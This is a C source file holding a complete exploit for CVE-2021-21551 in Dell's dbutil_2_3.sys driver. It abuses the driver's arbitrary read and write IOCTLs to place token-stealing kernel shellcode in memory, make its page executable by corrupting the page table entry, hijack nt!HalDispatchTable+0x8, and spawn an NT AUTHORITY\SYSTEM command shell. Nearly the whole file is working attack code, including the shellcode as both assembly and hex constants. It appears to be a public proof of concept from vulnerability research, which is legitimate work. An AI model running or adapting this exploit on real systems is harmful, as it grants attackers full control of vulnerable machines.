// CVE-2021-21551: Dell 'dbutil_2_3.sys' Memory Corruption
// Original research: https://labs.sentinelone.com/cve-2021-21551-hundreds-of-millions-of-dell-computers-at-risk-due-to-multiple-bios-driver-privilege-escalation-flaws/
// Author: Connor McGarr (@33y0re)

#include <stdio.h>
#include <Windows.h>
#include <Psapi.h>

// Vulnerable IOCTL
#define IOCTL_WRITE_CODE 0x9B0C1EC8
#define IOCTL_READ_CODE 0x9B0C1EC4

// Prepping call to nt!NtQueryIntervalProfile
typedef NTSTATUS(WINAPI* NtQueryIntervalProfile_t)(IN ULONG ProfileSource, OUT PULONG Interval);

// Obtain the kernel base and driver base
unsigned long long kernelBase(char name[])
{
	// Defining EnumDeviceDrivers() and GetDeviceDriverBaseNameA() parameters
	LPVOID lpImageBase[1024];
	DWORD lpcbNeeded;
	int drivers;
	char lpFileName[1024];
	unsigned long long imageBase;

	BOOL baseofDrivers = EnumDeviceDrivers(
		lpImageBase,
		sizeof(lpImageBase),
		&lpcbNeeded
	);

	// Error handling
	if (!baseofDrivers)
	{
		printf("[-] Error! Unable to invoke EnumDeviceDrivers(). Error: %d\n", GetLastError());
		exit(1);
	}

	// Defining number of drivers for GetDeviceDriverBaseNameA()
	drivers = lpcbNeeded / sizeof(lpImageBase[0]);

	// Parsing loaded drivers
	for (int i = 0; i < drivers; i++)
	{
		GetDeviceDriverBaseNameA(
			lpImageBase[i],
			lpFileName,
			sizeof(lpFileName) / sizeof(char)
		);

		// Keep looping, until found, to find user supplied driver base address
		if (!strcmp(name, lpFileName))
		{
			imageBase = (unsigned long long)lpImageBase[i];

			// Exit loop
			break;
		}
	}

	return imageBase;
}


void exploitWork(void)
{
	// Store the base of the kernel
	unsigned long long baseofKernel = kernelBase("ntoskrnl.exe");

	// Storing the base of the driver
	unsigned long long driverBase = kernelBase("dbutil_2_3.sys");

	// Print updates
	printf("[+] Base address of ntoskrnl.exe: 0x%llx\n", baseofKernel);
	printf("[+] Base address of dbutil_2_3.sys: 0x%llx\n", driverBase);

	// Store nt!MiGetPteAddress+0x13
	unsigned long long ntmigetpteAddress = baseofKernel + 0xbafbb;

	// Obtain a handle to the driver
	HANDLE driverHandle = CreateFileA(
		"\\\\.\\DBUtil_2_3",
		FILE_SHARE_DELETE | FILE_SHARE_READ | FILE_SHARE_WRITE,
		0x0,
		NULL,
		OPEN_EXISTING,
		0x0,
		NULL
	);

	// Error handling
	if (driverHandle == INVALID_HANDLE_VALUE)
	{
		printf("[-] Error! Unable to obtain a handle to the driver. Error: 0x%lx\n", GetLastError());
		exit(-1);
	}
	else
	{
		printf("[+] Successfully obtained a handle to the driver. Handle value: 0x%llx\n", (unsigned long long)driverHandle);

		// Buffer to send to the driver (read primitive)
		unsigned long long inBuf1[4];

		// Values to send
		unsigned long long one1 = 0x4141414141414141;
		unsigned long long two1 = ntmigetpteAddress;
		unsigned long long three1 = 0x0000000000000000;
		unsigned long long four1 = 0x0000000000000000;

		// Assign the values
		inBuf1[0] = one1;
		inBuf1[1] = two1;
		inBuf1[2] = three1;
		inBuf1[3] = four1;

		// Interact with the driver
		DWORD bytesReturned1 = 0;

		BOOL interact = DeviceIoControl(
			driverHandle,
			IOCTL_READ_CODE,
			&inBuf1,
			sizeof(inBuf1),
			&inBuf1,
			sizeof(inBuf1),
			&bytesReturned1,
			NULL
		);

		// Error handling
		if (!interact)
		{
			printf("[-] Error! Unable to interact with the driver. Error: 0x%lx\n", GetLastError());
			exit(-1);
		}
		else
		{
			// Last member of read array should contain base of the PTEs
			unsigned long long pteBase = inBuf1[3];

			printf("[+] Base of the PTEs: 0x%llx\n", pteBase);

			// .data section of dbutil_2_3.sys contains a code cave
			unsigned long long shellcodeLocation = driverBase + 0x3010;

			// Bitwise operations to locate PTE of shellcode page
			unsigned long long shellcodePte = (unsigned long long)shellcodeLocation >> 9;
			shellcodePte = shellcodePte & 0x7FFFFFFFF8;
			shellcodePte = shellcodePte + pteBase;

			// Print update
			printf("[+] PTE of the .data page the shellcode is located at in dbutil_2_3.sys: 0x%llx\n", shellcodePte);

			// Buffer to send to the driver (read primitive)
			unsigned long long inBuf2[4];

			// Values to send
			unsigned long long one2 = 0x4141414141414141;
			unsigned long long two2 = shellcodePte;
			unsigned long long three2 = 0x0000000000000000;
			unsigned long long four2 = 0x0000000000000000;

			inBuf2[0] = one2;
			inBuf2[1] = two2;
			inBuf2[2] = three2;
			inBuf2[3] = four2;

			// Parameter for DeviceIoControl
			DWORD bytesReturned2 = 0;

			BOOL interact1 = DeviceIoControl(
				driverHandle,
				IOCTL_READ_CODE,
				&inBuf2,
				sizeof(inBuf2),
				&inBuf2,
				sizeof(inBuf2),
				&bytesReturned2,
				NULL
			);

			// Error handling
			if (!interact1)
			{
				printf("[-] Error! Unable to interact with the driver. Error: 0x%lx\n", GetLastError());
				exit(-1);
			}
			else
			{
				// Last member of read array should contain PTE bits
				unsigned long long pteBits = inBuf2[3];

				printf("[+] PTE bits for the shellcode page: %p\n", pteBits);

				/*
					; Windows 10 1903 x64 Token Stealing Payload
					; Author Connor McGarr

					[BITS 64]

					_start:
						mov rax, [gs:0x188]		  ; Current thread (_KTHREAD)
						mov rax, [rax + 0xb8]	  ; Current process (_EPROCESS)
						mov rbx, rax			  ; Copy current process (_EPROCESS) to rbx
					__loop:
						mov rbx, [rbx + 0x2f0] 	  ; ActiveProcessLinks
						sub rbx, 0x2f0		   	  ; Go back to current process (_EPROCESS)
						mov rcx, [rbx + 0x2e8] 	  ; UniqueProcessId (PID)
						cmp rcx, 4 				  ; Compare PID to SYSTEM PID
						jnz __loop			      ; Loop until SYSTEM PID is found

						mov rcx, [rbx + 0x360]	  ; SYSTEM token is @ offset _EPROCESS + 0x360
						and cl, 0xf0			  ; Clear out _EX_FAST_REF RefCnt
						mov [rax + 0x360], rcx	  ; Copy SYSTEM token to current process

						xor rax, rax			  ; set NTSTATUS STATUS_SUCCESS
						ret						  ; Done!

				*/

				// One QWORD arbitrary write
				// Shellcode is 67 bytes (67/8 = 9 unsigned long longs)
				unsigned long long shellcode1 = 0x00018825048B4865;
				unsigned long long shellcode2 = 0x000000B8808B4800;
				unsigned long long shellcode3 = 0x02F09B8B48C38948;
				unsigned long long shellcode4 = 0x0002F0EB81480000;
				unsigned long long shellcode5 = 0x000002E88B8B4800;
				unsigned long long shellcode6 = 0x8B48E57504F98348;
				unsigned long long shellcode7 = 0xF0E180000003608B;
				unsigned long long shellcode8 = 0x4800000360888948;
				unsigned long long shellcode9 = 0x0000000000C3C031;

				// Buffers to send to the driver (write primitive)
				unsigned long long inBuf3[4];
				unsigned long long inBuf4[4];
				unsigned long long inBuf5[4];
				unsigned long long inBuf6[4];
				unsigned long long inBuf7[4];
				unsigned long long inBuf8[4];
				unsigned long long inBuf9[4];
				unsigned long long inBuf10[4];
				unsigned long long inBuf11[4];

				// Values to send
				unsigned long long one3 = 0x4141414141414141;
				unsigned long long two3 = shellcodeLocation;
				unsigned long long three3 = 0x0000000000000000;
				unsigned long long four3 = shellcode1;

				unsigned long long one4 = 0x4141414141414141;
				unsigned long long two4 = shellcodeLocation + 0x8;
				unsigned long long three4 = 0x0000000000000000;
				unsigned long long four4 = shellcode2;

				unsigned long long one5 = 0x4141414141414141;
				unsigned long long two5 = shellcodeLocation + 0x10;
				unsigned long long three5 = 0x0000000000000000;
				unsigned long long four5 = shellcode3;

				unsigned long long one6 = 0x4141414141414141;
				unsigned long long two6 = shellcodeLocation + 0x18;
				unsigned long long three6 = 0x0000000000000000;
				unsigned long long four6 = shellcode4;

				unsigned long long one7 = 0x4141414141414141;
				unsigned long long two7 = shellcodeLocation + 0x20;
				unsigned long long three7 = 0x0000000000000000;
				unsigned long long four7 = shellcode5;

				unsigned long long one8 = 0x4141414141414141;
				unsigned long long two8 = shellcodeLocation + 0x28;
				unsigned long long three8 = 0x0000000000000000;
				unsigned long long four8 = shellcode6;

				unsigned long long one9 = 0x4141414141414141;
				unsigned long long two9 = shellcodeLocation + 0x30;
				unsigned long long three9 = 0x0000000000000000;
				unsigned long long four9 = shellcode7;

				unsigned long long one10 = 0x4141414141414141;
				unsigned long long two10 = shellcodeLocation + 0x38;
				unsigned long long three10 = 0x0000000000000000;
				unsigned long long four10 = shellcode8;

				unsigned long long one11 = 0x4141414141414141;
				unsigned long long two11 = shellcodeLocation + 0x40;
				unsigned long long three11 = 0x0000000000000000;
				unsigned long long four11 = shellcode9;

				inBuf3[0] = one3;
				inBuf3[1] = two3;
				inBuf3[2] = three3;
				inBuf3[3] = four3;

				inBuf4[0] = one4;
				inBuf4[1] = two4;
				inBuf4[2] = three4;
				inBuf4[3] = four4;

				inBuf5[0] = one5;
				inBuf5[1] = two5;
				inBuf5[2] = three5;
				inBuf5[3] = four5;

				inBuf6[0] = one6;
				inBuf6[1] = two6;
				inBuf6[2] = three6;
				inBuf6[3] = four6;

				inBuf7[0] = one7;
				inBuf7[1] = two7;
				inBuf7[2] = three7;
				inBuf7[3] = four7;

				inBuf8[0] = one8;
				inBuf8[1] = two8;
				inBuf8[2] = three8;
				inBuf8[3] = four8;

				inBuf9[0] = one9;
				inBuf9[1] = two9;
				inBuf9[2] = three9;
				inBuf9[3] = four9;

				inBuf10[0] = one10;
				inBuf10[1] = two10;
				inBuf10[2] = three10;
				inBuf10[3] = four10;

				inBuf11[0] = one11;
				inBuf11[1] = two11;
				inBuf11[2] = three11;
				inBuf11[3] = four11;

				DWORD bytesReturned3 = 0;
				DWORD bytesReturned4 = 0;
				DWORD bytesReturned5 = 0;
				DWORD bytesReturned6 = 0;
				DWORD bytesReturned7 = 0;
				DWORD bytesReturned8 = 0;
				DWORD bytesReturned9 = 0;
				DWORD bytesReturned10 = 0;
				DWORD bytesReturned11 = 0;

				BOOL interact2 = DeviceIoControl(
					driverHandle,
					IOCTL_WRITE_CODE,
					&inBuf3,
					sizeof(inBuf3),
					&inBuf3,
					sizeof(inBuf3),
					&bytesReturned3,
					NULL
				);

				BOOL interact3 = DeviceIoControl(
					driverHandle,
					IOCTL_WRITE_CODE,
					&inBuf4,
					sizeof(inBuf4),
					&inBuf4,
					sizeof(inBuf4),
					&bytesReturned4,
					NULL
				);

				BOOL interact4 = DeviceIoControl(
					driverHandle,
					IOCTL_WRITE_CODE,
					&inBuf5,
					sizeof(inBuf5),
					&inBuf5,
					sizeof(inBuf5),
					&bytesReturned5,
					NULL
				);

				BOOL interact5 = DeviceIoControl(
					driverHandle,
					IOCTL_WRITE_CODE,
					&inBuf6,
					sizeof(inBuf6),
					&inBuf6,
					sizeof(inBuf6),
					&bytesReturned6,
					NULL
				);

				BOOL interact6 = DeviceIoControl(
					driverHandle,
					IOCTL_WRITE_CODE,
					&inBuf7,
					sizeof(inBuf7),
					&inBuf7,
					sizeof(inBuf7),
					&bytesReturned7,
					NULL
				);

				BOOL interact7 = DeviceIoControl(
					driverHandle,
					IOCTL_WRITE_CODE,
					&inBuf8,
					sizeof(inBuf8),
					&inBuf8,
					sizeof(inBuf8),
					&bytesReturned8,
					NULL
				);

				BOOL interact8 = DeviceIoControl(
					driverHandle,
					IOCTL_WRITE_CODE,
					&inBuf9,
					sizeof(inBuf9),
					&inBuf9,
					sizeof(inBuf9),
					&bytesReturned9,
					NULL
				);

				BOOL interact9 = DeviceIoControl(
					driverHandle,
					IOCTL_WRITE_CODE,
					&inBuf10,
					sizeof(inBuf10),
					&inBuf10,
					sizeof(inBuf10),
					&bytesReturned10,
					NULL
				);

				BOOL interact10 = DeviceIoControl(
					driverHandle,
					IOCTL_WRITE_CODE,
					&inBuf11,
					sizeof(inBuf11),
					&inBuf11,
					sizeof(inBuf11),
					&bytesReturned11,
					NULL
				);

				// A lot of error handling
				if (!interact2 || !interact3 || !interact4 || !interact5 || !interact6 || !interact7 || !interact8 || !interact9 || !interact10)
				{
					printf("[-] Error! Unable to interact with the driver. Error: 0x%lx\n", GetLastError());
					exit(-1);
				}
				else
				{
					printf("[+] Successfully wrote the shellcode to the .data section of dbutil_2_3.sys at address: 0x%llx\n", shellcodeLocation);

					// Clear the no-eXecute bit
					unsigned long long taintedPte = pteBits & 0x0FFFFFFFFFFFFFFF;

					printf("[+] Corrupted PTE bits for the shellcode page: %p\n", taintedPte);

					// Clear the no-eXecute bit in the actual PTE
					// Buffer to send to the driver (write primitive)
					unsigned long long inBuf13[4];

					// Values to send
					unsigned long long one13 = 0x4141414141414141;
					unsigned long long two13 = shellcodePte;
					unsigned long long three13 = 0x0000000000000000;
					unsigned long long four13 = taintedPte;

					// Assign the values
					inBuf13[0] = one13;
					inBuf13[1] = two13;
					inBuf13[2] = three13;
					inBuf13[3] = four13;


					// Interact with the driver
					DWORD bytesReturned13 = 0;

					BOOL interact12 = DeviceIoControl(
						driverHandle,
						IOCTL_WRITE_CODE,
						&inBuf13,
						sizeof(inBuf13),
						&inBuf13,
						sizeof(inBuf13),
						&bytesReturned13,
						NULL
					);

					// Error handling
					if (!interact12)
					{
						printf("[-] Error! Unable to interact with the driver. Error: 0x%lx\n", GetLastError());
					}
					else
					{
						printf("[+] Successfully corrupted the PTE of the shellcode page! The kernel mode page holding the shellcode should now be RWX!\n");

						// Offset to nt!HalDispatchTable+0x8
						unsigned long long halDispatch = baseofKernel + 0x427258;

						// Use arbitrary read primitive to preserve nt!HalDispatchTable+0x8
						// Buffer to send to the driver (write primitive)
						unsigned long long inBuf14[4];

						// Values to send
						unsigned long long one14 = 0x4141414141414141;
						unsigned long long two14 = halDispatch;
						unsigned long long three14 = 0x0000000000000000;
						unsigned long long four14 = 0x0000000000000000;

						// Assign the values
						inBuf14[0] = one14;
						inBuf14[1] = two14;
						inBuf14[2] = three14;
						inBuf14[3] = four14;

						// Interact with the driver
						DWORD bytesReturned14 = 0;

						BOOL interact13 = DeviceIoControl(
							driverHandle,
							IOCTL_READ_CODE,
							&inBuf14,
							sizeof(inBuf14),
							&inBuf14,
							sizeof(inBuf14),
							&bytesReturned14,
							NULL
						);

						// Error handling
						if (!interact13)
						{
							printf("[-] Error! Unable to interact with the driver. Error: 0x%lx\n", GetLastError());
						}
						else
						{
							// Last member of read array should contain preserved nt!HalDispatchTable+0x8 value
							unsigned long long preservedHal = inBuf14[3];

							printf("[+] Preserved nt!HalDispatchTable+0x8 value: 0x%llx\n", preservedHal);

							// Leveraging arbitrary write primitive to overwrite nt!HalDispatchTable+0x8
							// Buffer to send to the driver (write primitive)
							unsigned long long inBuf15[4];

							// Values to send
							unsigned long long one15 = 0x4141414141414141;
							unsigned long long two15 = halDispatch;
							unsigned long long three15 = 0x0000000000000000;
							unsigned long long four15 = shellcodeLocation;

							// Assign the values
							inBuf15[0] = one15;
							inBuf15[1] = two15;
							inBuf15[2] = three15;
							inBuf15[3] = four15;

							// Interact with the driver
							DWORD bytesReturned15 = 0;

							BOOL interact14 = DeviceIoControl(
								driverHandle,
								IOCTL_WRITE_CODE,
								&inBuf15,
								sizeof(inBuf15),
								&inBuf15,
								sizeof(inBuf15),
								&bytesReturned15,
								NULL
							);

							// Error handling
							if (!interact14)
							{
								printf("[-] Error! Unable to interact with the driver. Error: 0x%lx\n", GetLastError());
							}
							else
							{
								printf("[+] Successfully overwrote the pointer at nt!HalDispatchTable+0x8!\n");

								// Locating nt!NtQueryIntervalProfile
								NtQueryIntervalProfile_t NtQueryIntervalProfile = (NtQueryIntervalProfile_t)GetProcAddress(
									GetModuleHandle(
										TEXT("ntdll.dll")),
									"NtQueryIntervalProfile"
								);

								// Error handling
								if (!NtQueryIntervalProfile)
								{
									printf("[-] Error! Unable to find ntdll!NtQueryIntervalProfile! Error: %d\n", GetLastError());
									exit(1);
								}
								else
								{
									// Print update for found ntdll!NtQueryIntervalProfile
									printf("[+] Located ntdll!NtQueryIntervalProfile at: 0x%llx\n", NtQueryIntervalProfile);

									// Calling nt!NtQueryIntervalProfile
									ULONG exploit = 0;

									NtQueryIntervalProfile(
										0x1234,
										&exploit
									);

									// Restoring nt!HalDispatchTable+0x8
									// Buffer to send to the driver (write primitive)
									unsigned long long inBuf16[4];

									// Values to send
									unsigned long long one16 = 0x4141414141414141;
									unsigned long long two16 = halDispatch;
									unsigned long long three16 = 0x0000000000000000;
									unsigned long long four16 = preservedHal;

									// Assign the values
									inBuf16[0] = one16;
									inBuf16[1] = two16;
									inBuf16[2] = three16;
									inBuf16[3] = four16;

									// Interact with the driver
									DWORD bytesReturned16 = 0;

									BOOL interact15 = DeviceIoControl(
										driverHandle,
										IOCTL_WRITE_CODE,
										&inBuf16,
										sizeof(inBuf16),
										&inBuf16,
										sizeof(inBuf16),
										&bytesReturned16,
										NULL
									);

									// Error handling
									if (!interact15)
									{
										printf("[-] Error! Unable to interact with the driver. Error: 0x%lx\n", GetLastError());
									}
									else
									{
										printf("[+] Successfully restored the pointer at nt!HalDispatchTable+0x8!\n");
										printf("[+] Enjoy the NT AUTHORITY\\SYSTEM shell!\n");

										// Spawning an NT AUTHORITY\SYSTEM shell
										system("cmd.exe /c cmd.exe /K cd C:\\");
									}
								}
							}
						}
					}
				}
			}
		}
	}
}

// Call exploitWork()
void main(void)
{
	exploitWork();
}
